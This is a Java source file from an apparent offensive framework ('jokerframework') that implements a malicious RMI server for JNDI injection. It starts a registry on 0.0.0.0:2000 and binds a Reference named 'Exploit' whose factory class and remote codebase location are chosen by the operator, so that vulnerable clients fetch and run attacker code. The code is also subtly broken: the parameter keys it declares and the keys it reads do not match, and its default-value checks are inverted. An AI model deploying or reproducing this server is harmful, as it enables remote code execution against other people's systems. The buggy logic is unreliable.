package com.lucifaer.jokerframework.server;

import com.lucifaer.jokerframework.core.context.ShellContext;
import com.lucifaer.jokerframework.core.server.JokerBaseServer;
import com.lucifaer.jokerframework.core.server.JokerServer;
import com.lucifaer.jokerframework.core.shell.ShellThrowableHandler;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.Map;

@Component(value = "rmi-server")
@Scope("prototype")
public class RmiServer extends JokerBaseServer implements JokerServer {
    @Autowired
    ShellThrowableHandler shellThrowableHandler;

    private Registry registry;

    private static final String defaultUrl = "0.0.0.0";
    private static final String defaultPort = "2000";

    public RmiServer() {
        this.serverName = "rmi-server";
        this.serverUrl = defaultUrl;
        this.serverPort = defaultPort;
        this.expactedParams.put("remote_className", null);
        this.expactedParams.put("remote_FactoryName", null);
        this.expactedParams.put("remote_FactoryLocation", null);
    }

    @Override
    public void createServer(ShellContext shellContext) {
        Map<String, String> shellParams = shellContext.getParams();
        this.serverUrl = serverUrl == null ? "0.0.0.0" : shellParams.get("serverUrl");
        this.serverPort = serverPort == null ? "2000" : shellParams.get("serverPort");
        try {
            registry = LocateRegistry.createRegistry(Integer.parseInt(this.serverPort));
            Reference reference = generateReference(shellContext.getParams());
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.rebind("Exploit", referenceWrapper);
        } catch (RemoteException | NamingException e) {
            shellThrowableHandler.handleThrowable(e);
        }
    }

    @Override
    public void stopServer() {
        try {
            Naming.unbind("rmi://" + this.serverUrl + ":" + this.serverPort + "/Exploit");
            UnicastRemoteObject.unexportObject(registry, true);
        } catch (Exception e) {
            shellThrowableHandler.handleThrowable(e);
        }
    }

    private Reference generateReference(Map<String, String> params) {
        String className = params.get("rmi_ClassName");
        String factoryName = params.get("rmi_FactoryName");
        String factoryLocation = params.get("rmi_FactoryLocation");
        try {
            return new Reference(className, factoryName, factoryLocation);
        } catch (Exception e) {
            shellThrowableHandler.handleThrowable(e);
        }
        return null;
    }
}
